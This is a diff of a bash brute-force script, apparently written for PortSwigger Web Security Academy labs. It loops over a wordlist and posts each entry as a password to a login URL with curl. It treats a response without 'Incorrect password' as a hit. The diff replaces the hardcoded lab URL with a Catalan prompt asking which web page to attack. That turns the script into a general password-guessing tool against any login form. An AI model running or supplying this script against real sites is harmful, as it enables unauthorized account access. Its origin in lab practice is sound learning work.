@@ -1,7 +1,9 @@
 #!/bin/bash
 document=a.txt
 start=1
-URL="https://ac6c1fe31ecf1652c0401cc800020096.web-security-academy.net/login"
+echo "Quina pagina web vols atacar? Recorda introduir exactament l'enllaç de la pàgina on es fa el login"
+read URL
+echo "Recorda que aquest procés pot trigar minuts."
 total=$(wc -l < $document)
 while [[ $start -le $total ]]
     do
@@ -27,7 +29,7 @@ while [[ $start -le $total ]]
 #    curl -s -d "username=$test&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
     if ! [[ $(curl -s -d "username=$username&password=$test" $URL | grep "Incorrect password") ]]
     then
-        echo -e "password is $test"
+        echo -e "La contrasenya és $test"
         password=$test
         break 1
     fi
